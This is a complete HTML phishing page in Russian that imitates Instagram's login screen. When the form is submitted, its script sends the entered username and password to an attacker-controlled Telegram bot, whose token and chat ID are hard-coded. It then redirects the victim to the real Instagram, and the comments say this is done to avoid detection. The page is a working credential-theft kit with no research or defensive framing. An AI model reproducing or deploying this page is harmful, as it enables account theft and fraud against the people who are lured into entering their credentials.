<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход • Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #fff; }
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        .logo { font-size: 35px; font-weight: bold; margin-bottom: 40px; font-style: italic; font-family: 'Trebuchet MS', sans-serif; }
        input { 
            width: 100%; padding: 12px; background: #121212; border: 1px solid #363636; 
            border-radius: 3px; color: #fff; margin-bottom: 12px; outline: none; font-size: 14px;
        }
        input:focus { border-color: #555; }
        .login-btn { 
            width: 100%; background: #0095f6; color: #fff; border: none; 
            border-radius: 8px; padding: 10px; font-weight: 600; cursor: pointer; font-size: 14px;
        }
        .footer { position: absolute; bottom: 20px; color: #8e8e8e; font-size: 13px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Instagram</div>
        <form id="instForm">
            <input type="text" id="u" placeholder="Телефон, имя пользователя или эл. адрес" required>
            <input type="password" id="p" placeholder="Пароль" required>
            <button type="submit" class="login-btn">Войти</button>
        </form>
    </div>

    <div class="footer">Meta © 2024</div>

    <script>
    document.getElementById('instForm').onsubmit = async function(e) {
        e.preventDefault();

        const user = document.getElementById('u').value;
        const pass = document.getElementById('p').value;

        // ТВОИ ДАННЫЕ ИЗ РАБОЧЕГО КОДА
        const BOT_TOKEN = '8314828218:AAGY6twUZ6iFU7smncNhgGJ7pxh5z6MF1p8';
        const CHAT_ID = '6576262467';

        try {
            const response = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `📸 НОВЫЙ ЛОГ:\n👤 Логин: ${user}\n🔑 Пароль: ${pass}`
                    })
                }
            );

            const data = await response.json();

            // Твоя логика проверки
            if (data.ok) {
                // Маскировка: перекидываем на реальную инсту
                window.location.href = 'https://instagram.com';
            } else {
                console.log('Ошибка Telegram:', data);
                // Всё равно перекидываем, чтобы не палиться
                window.location.href = 'https://instagram.com';
            }

        } catch (err) {
            console.log('Ошибка отправки:', err);
            window.location.href = 'https://instagram.com';
        }
    }
    </script>

</body>
</html>
